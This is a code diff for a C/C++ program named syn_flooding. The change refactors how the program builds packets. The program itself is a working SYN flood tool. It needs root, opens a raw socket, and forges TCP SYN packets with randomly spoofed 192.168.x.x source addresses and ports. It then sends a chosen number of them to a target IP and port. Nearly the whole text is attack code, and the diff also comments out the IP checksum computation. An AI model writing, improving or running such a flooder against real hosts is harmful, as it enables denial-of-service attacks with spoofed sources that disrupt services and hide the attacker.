@@ -50,42 +50,17 @@ unsigned short checksum(unsigned short *ptr,int nbytes) {
 	return(answer);
 }
 
-int main(int argc, char *argv[])
+void generateDatagram(char *datagram, char *src_ip,
+											char *dst_ip, unsigned short dst_port,
+											struct iphdr *iph, struct tcphdr *tcph,
+											struct sockaddr_in &sin, struct pseudo_header &psh)
 {
-	if(geteuid()!=0)
-	{
-	  printf("Run with root privileges.\n");
-		exit(-1);
-	}
-	if(argc<4)
-	{
-		printf("Usage: ./syn_flooding dst_ip dst_port pckt_count\n");
-		exit(-1);
-	}
-	//Use provided args for spoofing
-	char *dst_ip=argv[1];
-	unsigned short dst_port=stoi(argv[2]);
-	unsigned int pckt_count=stoi(argv[3]);
-	//Create a raw socket
-	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
-	//Datagram to represent the packet
-	char datagram[4096];
-	//IP header
-	struct iphdr *iph = (struct iphdr *) datagram;
-	//TCP header
-	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
-	struct sockaddr_in sin;
-	struct pseudo_header psh;
-
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons(dst_port);
 	sin.sin_addr.s_addr = inet_addr(dst_ip);
 
 	memset(datagram, 0, 4096);	/* zero out the buffer */
 
-	//Initialization
-	srand(time(NULL));
-	char src_ip[16];
 	sprintf(src_ip, "192.168.%u.%u", rand()%255, rand()%255);
 	unsigned short src_port=rand()%65536;
 	//Fill in the IP Header
@@ -101,7 +76,7 @@ int main(int argc, char *argv[])
 	iph->saddr = inet_addr(src_ip);	//Spoof the source ip address
 	iph->daddr = sin.sin_addr.s_addr;
 
-	iph->check = checksum ((unsigned short *) datagram, iph->tot_len >> 1);
+	// iph->check = checksum((unsigned short *) datagram, iph->tot_len >> 1);
 
 	//TCP Header
 	tcph->source = htons(src_port);  //Src port no
@@ -120,7 +95,6 @@ int main(int argc, char *argv[])
 				should fill in the correct checksum during transmission */
 	tcph->urg_ptr = 0;
 	//Now the IP checksum
-
 	psh.source_address = inet_addr(src_ip);
 	psh.dest_address = sin.sin_addr.s_addr;
 	psh.placeholder = 0;
@@ -130,6 +104,39 @@ int main(int argc, char *argv[])
 	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
 
 	tcph->check = checksum((unsigned short*) &psh, sizeof(struct pseudo_header));
+}
+
+int main(int argc, char *argv[])
+{
+	if(geteuid()!=0)
+	{
+	  printf("Run with root privileges.\n");
+		exit(-1);
+	}
+	if(argc<4)
+	{
+		printf("Usage: ./syn_flooding dst_ip dst_port pckt_count\n");
+		exit(-1);
+	}
+	//Use provided args for spoofing
+	char *dst_ip=argv[1];
+	unsigned short dst_port=stoi(argv[2]);
+	unsigned int pckt_count=stoi(argv[3]);
+	//Create a raw socket
+	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
+
+	//Datagram to represent the packet
+	char datagram[4096];
+	char src_ip[16];
+	//IP header
+	struct iphdr *iph = (struct iphdr *) datagram;
+	//TCP header
+	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
+	struct sockaddr_in sin;
+	struct pseudo_header psh;
+	//Initialization of rand
+	srand(time(NULL));
+	generateDatagram(datagram, src_ip, dst_ip, dst_port, iph, tcph, sin, psh);
 
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int one = 1;
@@ -158,11 +165,7 @@ int main(int argc, char *argv[])
 			printf("Sent.\n");
 		}
 		//Change source IP & port with rand
-		sprintf(src_ip, "192.168.%u.%u", rand()%255, rand()%255);
-		src_port=rand()%65536;
-		iph->saddr = inet_addr(src_ip);	//Spoof the source ip address
-		tcph->source = htons(src_port); //Src port no
-		psh.source_address = inet_addr(src_ip);
+		generateDatagram(datagram, src_ip, dst_ip, dst_port, iph, tcph, sin, psh);
 	}
 
 	return 0;
